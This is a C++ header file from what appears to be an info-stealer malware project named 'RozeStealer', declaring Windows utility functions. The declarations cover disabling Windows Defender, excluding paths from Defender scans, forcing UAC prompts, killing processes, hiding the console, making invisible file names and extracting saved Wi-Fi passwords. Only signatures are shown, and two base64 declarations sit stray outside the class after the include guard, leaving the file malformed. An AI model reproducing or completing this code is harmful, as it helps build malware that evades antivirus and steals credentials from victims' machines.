#ifndef ROZE_STEALER_UTILITY_H
#define ROZE_STEALER_UTILITY_H

#include <string>
#include <vector>
#include <map>
#include <windows.h>

namespace RozeStealer {

class Utility {
public:
    static void toggleConsole(bool show);
    static bool isAdmin();
    static std::string getSelfDir();
    static bool checkInternetConnection();
    static bool checkForUpdates();
    static void checkConfiguration();
    static void taskKill(const std::vector<std::string>& tasks);
    static bool uacPrompt(const std::string& path);
    static void disableDefender();
    static void excludeFromDefender(const std::string& path = "");
    static std::string getRandomString(int length = 5, bool invisible = false);
    static std::map<std::string, std::string> getWifiPasswords();
    static std::string getLnkTarget(const std::string& pathToLnk);
};

} // namespace RozeStealer

#endif // ROZE_STEALER_UTILITY_H



    static std::string base64Encode(const std::string& data);
    static std::string base64Decode(const std::string& data);


